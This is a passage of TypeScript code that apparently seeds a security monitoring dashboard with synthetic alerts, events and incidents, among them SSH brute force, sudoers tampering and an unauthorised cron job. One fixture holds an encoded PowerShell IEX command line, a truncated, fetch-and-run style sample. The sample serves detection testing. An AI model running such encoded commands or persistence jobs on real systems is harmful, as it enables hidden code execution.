      ago: 41, severity: 'low', rule: 'Suricata: ET POLICY outbound NTP to public pool', category: 'Policy',
      reason: 'NTP traffic to 185.220.101.7 bypassed the internal time source', host: 'wrk-st-07', srcIp: '10.20.30.19',
      dstIp: '185.220.101.7', user: 't.brooks', status: 'acknowledged', source: 'demo_generator',
    },
    {
      ago: 58, severity: 'high', rule: 'sshd: brute force attempt against jump-01 (5760)', category: 'Authentication',
      reason: '19 failed attempts from 45.146.164.110 in 6 minutes; all for accounts that do not exist', host: 'jump-01',
      srcIp: '45.146.164.110', dstIp: '10.20.9.8', user: 'root', status: 'false_positive', source: 'wazuh',
    },
    {
      ago: 96, severity: 'critical', rule: 'Integrity monitor: /etc/sudoers modified (5561)', category: 'File Integrity',
      reason: 'sha256 of /etc/sudoers changed on web-02 outside the configuration-management window', host: 'web-02',
      srcIp: null, dstIp: null, user: null, status: 'new', source: 'wazuh',
    },
    {
      ago: 122, severity: 'low', rule: 'Sysmon: suspicious image load (unsigned dll)', category: 'Defense Evasion',
      reason: 'wrk-st-07 loaded winmm.dll from \\AppData\\Local\\Temp\\ signed by an unknown publisher', host: 'wrk-st-07',
      srcIp: null, dstIp: null, user: 'd.novak', status: 'investigating', source: 'sysmon',
    },
    {
      ago: 149, severity: 'informational', rule: 'wazuh: FIM scan completed with 3 new files', category: 'File Integrity',
      reason: 'Routine baseline scan on monitor-01', host: 'monitor-01', srcIp: null, dstIp: null, user: null,
      status: 'resolved', source: 'wazuh',
    },
    {
      ago: 168, severity: 'high', rule: 'Windows: logon from a new geolocation', category: 'Authentication',
      reason: 'Interactive RDP logon for d.novak from an ASN not seen in 60 days for this account', host: 'L-TP-0310',
      srcIp: '91.219.236.18', dstIp: '10.20.30.44', user: 'd.novak', status: 'acknowledged', source: 'sysmon',
    },
    {
      ago: 214, severity: 'low', rule: 'Cron: unauthorised job added by m.okafor', category: 'Persistence',
      reason: 'New crontab entry running /tmp/rotate.sh every 10 minutes on web-02', host: 'web-02', srcIp: null,
      dstIp: null, user: 'm.okafor', status: 'new', source: 'linux_auth',
    },
    {
      ago: 260, severity: 'informational', rule: 'PAM: session opened for oracle on db-prod-01', category: 'Authentication',
      reason: 'Interactive session at 02:10Z, outside the maintenance window but matching the job schedule', host: 'db-prod-01',
      srcIp: '10.20.9.8', dstIp: '10.20.7.30', user: 'oracle_agent', status: 'resolved', source: 'linux_auth',
    },
    {
      ago: 333, severity: 'high', rule: 'Sysmon: PowerShell encoded command', category: 'Execution',
      reason: '-EncodedCommand IEX(...) executed by L-TP-0142 under j.rivera', host: 'L-TP-0142', srcIp: null, dstIp: null,
      user: 'j.rivera', status: 'new', source: 'sysmon',
    },
  ];
  for (const def of standaloneDefs) {
    const host = h(def.host);
    const at = now - def.ago * MIN;
    const evKey = uid();
    const raw =
      def.source === 'linux_auth'
        ? cronLine(at, host, def.user ?? 'root', '/tmp/rotate.sh')
        : def.source === 'sysmon'
          ? sysmonProcessCreate({
              ts: at,
              host,
              image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
              commandLine: 'powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQ==',
              parent: 'C:\\Windows\\explorer.exe',
              user: def.user ?? 'unknown',
              hash: 'SHA256=8E2F6B1C9D4A7E0F3B6C9D2E5F8A1B4C7D0E3F6A9B2C5D8E1F4A7B0C3D6E9F2',
            })
          : wazuhAlert({
              ts: at,
              host,
              ruleId: String(500 + def.ago),
              level: def.severity === 'critical' ? 12 : def.severity === 'high' ? 9 : def.severity === 'low' ? 5 : 3,
              description: def.rule,
              groups: ['syslog', def.category.toLowerCase().replace(/\s+/g, '_'), 'demo'],
              srcIp: def.srcIp ?? undefined,
              dstIp: def.dstIp ?? undefined,
              user: def.user ?? undefined,
              fullEvent: def.reason,
            });
    addEv(
      at,
      evKey,
      draft({
        timestamp: isoTime(at),
        source: def.source,
        event_type: def.category.toLowerCase().replace(/\s+/g, '_'),
        hostname: def.host,
        username: def.user,
        src_ip: def.srcIp,
        dst_ip: def.dstIp,
        severity: def.severity,
        raw,
        normalized: {
          rule_name: def.rule,
          category: def.category,
          agent_id: host.agent_id,
          hostname: def.host,
          host_ip: host.ip,
          os: host.os,
        },
        demo: true,
      }),
    );
    addAl(at, [evKey], {
      severity: def.severity,
      rule_name: def.rule,
      src_ip: def.srcIp,
      dst_ip: def.dstIp,
      username: def.user,
      hostname: def.host,
      event_category: def.category,
      detection_reason: def.reason,
      investigation_status: def.status,
      incident_id: null,
      source: def.source,
      demo: true,
    });
  }

  /* ============================ background noise ============================ */
  const noiseHosts = Object.keys(HOST_BY_NAME);
  const noiseUsers = ['a.sardhi', 'm.okafor', 'j.rivera', 't.brooks', 'l.chen', 'd.novak', 'k.iqbal', 'svc-backup', 'svc-jenkins', 'sqlagent'];
  const noiseTypes: { type: string; sev: Severity; make: (host: HostFixture, at: number, user: string, srcIp: string) => DraftEvent }[] = [
    {
      type: 'sshd_session_opened',
      sev: 'informational',
      make: (host, at, user, srcIp) =>
        draft({
          timestamp: isoTime(at),
          source: 'linux_auth',
          event_type: 'sshd_session_opened',
          hostname: host.hostname,
          username: user,
          src_ip: srcIp,
          dst_ip: host.ip,
          severity: 'informational',
          raw: sshdSessionOpen(at, host, user),
          normalized: { service: 'sshd', action: 'session_opened', agent_id: host.agent_id, os: host.os },
          demo: true,
        }),
    },
    {
      type: 'sshd_authentication_failed',
      sev: 'low',
      make: (host, at, user, srcIp) =>
        draft({
          timestamp: isoTime(at),
          source: 'linux_auth',
          event_type: 'sshd_authentication_failed',
          hostname: host.hostname,
          username: user,
          src_ip: srcIp,
          dst_ip: host.ip,
          severity: 'low',
          raw: sshdPam(at, host, user, srcIp),
          normalized: { service: 'sshd', action: 'pam_failure', uid: 0, agent_id: host.agent_id },
          demo: true,
        }),
    },
    {
      type: 'sshd_accepted_password',
      sev: 'informational',
      make: (host, at, user, srcIp) =>
        draft({
          timestamp: isoTime(at),
          source: 'linux_auth',
          event_type: 'sshd_accepted_password',
          hostname: host.hostname,
          username: user,
          src_ip: srcIp,
          dst_ip: host.ip,
          severity: 'informational',
          raw: sshdAccepted(at, host, user, srcIp, 40000 + (at % 20000)),
          normalized: { service: 'sshd', action: 'success', authentication: 'password', agent_id: host.agent_id },
          demo: true,
        }),
    },
    {
      type: 'cron_job_executed',
      sev: 'informational',
      make: (host, at, user) =>
        draft({
          timestamp: isoTime(at),
          source: 'wazuh',
          event_type: 'cron_job_executed',
          hostname: host.hostname,
          username: user,
          src_ip: null,
          dst_ip: null,
          severity: 'informational',
          raw: cronLine(at, host, user, '/usr/local/bin/backup-rotate.sh'),
          normalized: { program: 'CRON', agent_id: host.agent_id, command: '/usr/local/bin/backup-rotate.sh' },
          demo: true,
        }),
    },
    {
      type: 'sudo_command',
      sev: 'low',
      make: (host, at, user) =>
        draft({
          timestamp: isoTime(at),
          source: 'linux_auth',
          event_type: 'sudo_command',
          hostname: host.hostname,
          username: user,
          src_ip: null,
          dst_ip: null,
          severity: 'low',
          raw: sudoLine(at, host, user, 'pts/1', '/systemctl restart nginx'),
          normalized: { program: 'sudo', target_user: 'root', command: '/systemctl restart nginx', agent_id: host.agent_id },
          demo: true,
        }),
    },
    {
      type: 'firewall_blocked_connection',
      sev: 'informational',
      make: (host, at, _u, srcIp) =>
        draft({
          timestamp: isoTime(at),
          source: 'wazuh',
          event_type: 'firewall_blocked_connection',
          hostname: host.hostname,
          username: null,
          src_ip: srcIp,
          dst_ip: host.ip,
          severity: 'informational',
          raw: connTrack(at, host, srcIp, 1024 + (at % 60000), host.ip, 443),
          normalized: { firewall: 'ufw', action: 'blocked', protocol: 'TCP', dst_port: 443, agent_id: host.agent_id },
          demo: true,
        }),
    },
    {
      type: 'sysmon_network_connect',
      sev: 'informational',
      make: (host, at, user) =>
        draft({
          timestamp: isoTime(at),
          source: 'sysmon',
          event_type: 'sysmon_network_connect',
          hostname: host.hostname,
          username: user,
          src_ip: host.ip,
          dst_ip: '10.20.9.20',
          severity: 'informational',
          raw: sysmonProcessCreate({
            ts: at,
            host,
            image: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
            commandLine: '--type=renderer',
            parent: 'C:\\Windows\\explorer.exe',
            user,
            hash: 'SHA256=0000000000000000000000000000000000000000000000000000000000000000',
          }),
          normalized: {
            event_id: 3,
            provider: 'Microsoft-Windows-Sysmon',
            initiated: true,
            destination_port: 443,
            destination_ip: '140.82.121.4',
            image: 'chrome.exe',
          },
          demo: true,
        }),
    },
    {
      type: 'windows_account_logon',
      sev: 'informational',
      make: (host, at, user, srcIp) =>
        draft({
          timestamp: isoTime(at),
          source: 'sysmon',
          event_type: 'windows_security_logon_success',
          hostname: host.hostname,
          username: user,
          src_ip: srcIp,
          dst_ip: host.ip,
          severity: 'informational',
          raw: windowsSecurityEvent({
            ts: at,
            host,
            eventID: 4624,
            keywords: 'Audit Success',
            message: 'An account was successfully logged on.',
            fields: {
              'Subject Account Name': user,
              'Account Domain': 'CORP',
              'Logon Type': '10',
              'Source Network Address': srcIp,
              'Authentication Package': 'Kerberos',
              'Logon ID': `0x${(at % 99999).toString(16).toUpperCase()}`,
            },
          }),
          normalized: { event_id: 4624, logon_type: 10, package: 'Kerberos', source_network: srcIp },
          demo: true,
        }),
    },
  ];

  const internalPeers = ['10.20.9.8', '10.20.9.20', '10.20.5.11', '10.20.7.30', '10.20.30.61', '10.20.1.5'];
  for (let i = 0; i < 620; i++) {
    const at = now - rng.next() * 47 * HOUR;
    const hostName = rng.pick(noiseHosts);
    const host = h(hostName);
    const user = rng.pick(noiseUsers);
    const t = rng.weight(
      noiseTypes.map((nt, idx) => [idx, nt.type.includes('blocked') || nt.type.includes('failed') ? 1.4 : 1] as [number, number]),
    );
    const srcIp = rng.chance(0.7) ? rng.pick(internalPeers) : rng.pick(['203.0.113.98', '198.51.100.23', '91.219.236.18', '94.102.51.15']);
    addEv(at, uid(), noiseTypes[t].make(host, at, user, srcIp));
  }

  /* ================================ finalise ================================ */
  evs.sort((a, b) => a.ts - b.ts);
  const eventKeyToId = new Map<string, number>();
  evs.forEach((e, i) => eventKeyToId.set(e.key, i + 1));

  const events: SecurityEvent[] = evs.map((e, i) => ({
    id: i + 1,
    ...e.d,
    alert_id: null,
    incident_id: null,
  }));

  als.sort((a, b) => a.ts - b.ts);
  const alerts: Alert[] = als.map((a, i) => {
    const eventIds = a.eventKeys.map((k) => eventKeyToId.get(k)).filter((x): x is number => x !== undefined);
    return { id: i + 1, timestamp: isoTime(a.ts), event_ids: eventIds, ...a.f };
  });

  alerts.forEach((alert) => {
    for (const eid of alert.event_ids) {
      const ev = events[eid - 1];
      if (ev) {
        ev.alert_id = alert.id;
        ev.incident_id = alert.incident_id;
      }
    }
  });

  incs.sort((a, b) => a.start - b.start);
  const incidents: Incident[] = incs.map((rec, i) => {
    const alertIds = rec.alertKeys.map((k) => als.findIndex((a) => a.key === k) + 1).filter((x) => x > 0);
    const eventIds = Array.from(new Set(alertIds.map((id) => alerts[id - 1].event_ids).flat())).sort((x, y) => x - y);
    const inc: Incident = {
      id: i + 1,
      created_at: isoTime(rec.start),
      updated_at: isoTime(rec.updated),
      ai: null,
      alert_ids: alertIds,
      event_ids: eventIds,
      ...rec.f,
    };
    alertIds.forEach((id) => {
      alerts[id - 1].incident_id = inc.id;
    });
    eventIds.forEach((id) => {
      events[id - 1].incident_id = inc.id;
    });
    return inc;
  });

  for (const inc of incidents) {
    const linkedAlerts = inc.alert_ids.map((id) => alerts[id - 1]);
    const linkedEvents = inc.event_ids.map((id) => events[id - 1]);
    inc.ai = analyzeIncident(inc, linkedAlerts, linkedEvents);
  }

  return { events, alerts, incidents, generatedAt: isoTime(now) };
}
